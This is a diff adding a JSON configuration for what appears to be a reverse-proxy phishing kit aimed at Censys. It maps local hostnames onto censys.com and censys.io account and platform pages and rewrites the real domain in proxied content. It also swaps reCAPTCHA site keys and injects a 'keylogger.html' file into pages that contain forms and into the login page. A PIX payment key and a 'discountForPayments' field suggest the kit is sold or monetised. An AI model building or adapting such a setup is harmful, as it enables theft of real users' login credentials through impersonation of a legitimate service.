@@ -1,0 +1,83 @@
+{
+  "serverSettings": {
+    "worker_num": 1,
+    "max_request": 20000000,
+    "enable_coroutine": true,
+    "http_compression": true,
+    "max_coroutine": 20000000,
+    "enable_reuse_port": false,
+    "open_cpu_affinity": false,
+    "max_request_grace": 600000,
+    "open_tcp_keepalive": false,
+    "http_compression_level": 3,
+    "ssl_cert_file": "server.crt",
+    "ssl_key_file": "server.key"
+  },
+  "server": {
+    "endPoints": {
+      "localhost": "https://censys.com",
+      "www.localhost": "https://www.censys.com",
+      "com.localhost": "https://censys.com",
+      "dynamic.localhost": "https://www.example.com",
+      "account.localhost": "https://account.censys.io",
+      "platform.localhost": "https://platform.censys.io"
+    },
+    "remoteAddress": "https://censys.io",
+    "localPortListener": 443,
+    "pixKey": "brasil...",
+    "autoGenerateSslCertificate": true,
+    "currentDomain": "https://localhost",
+    "discountForPayments": 35,
+    "accessPolicy": true,
+    "enableCache": false,
+    "extraReplace": [
+      {
+        "replace": "censys.io",
+        "with": "localhost"
+      },
+      {
+        "replace": "6LeetcMeAAAAAHBLMG_uCF4A7QLR8ZHg8u4ulR5z",
+        "with": "6LfbTFogAAAAALr1zdydd7kSSEvK1WikWcTx1rNd"
+      },
+      {
+        "replace": "tezzT=iso-8859-1",
+        "with": "zzz"
+      }
+    ],
+    "injection": [
+      {
+        "bodyContain": "<form",
+        "inject": "keylogger.html"
+      },
+      {
+        "bodyContain": "(funxction()",
+        "replace": "httzzpsx",
+        "with": "httzzzp"
+      },
+      {
+        "bodyContain": "(functxion()",
+        "replace": "example.io.censy",
+        "with": "localhostx"
+      },
+      {
+        "urlContain": "ys.io/login?return_to=htt",
+        "bodyContain": "<body",
+        "inject": "keylogger.html"
+      }
+    ]
+  },
+  "autoload": [
+    "Request/router",
+    "Start/server",
+    "Start/console",
+    "Extension/plugins",
+    "Extension/terminal",
+    "Message/Message",
+    "Request/pages"
+  ],
+  "reloadCaseFileModify": [
+    "php",
+    "html"
+  ]
+}
+
